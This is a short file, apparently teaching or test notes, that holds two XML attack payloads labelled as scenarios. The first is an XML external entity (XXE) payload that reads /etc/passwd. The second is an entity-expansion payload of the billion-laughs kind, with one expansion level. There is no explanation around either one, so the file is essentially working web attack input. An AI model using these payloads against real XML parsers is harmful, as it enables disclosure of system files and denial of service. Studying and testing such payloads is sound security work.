# Scenario 1

```xml
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```

# Scenario 2 

```xml
<!DOCTYPE data [
<!ENTITY a0 "vulnerabilidade" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">]>
<data>&a1;</data>
 ```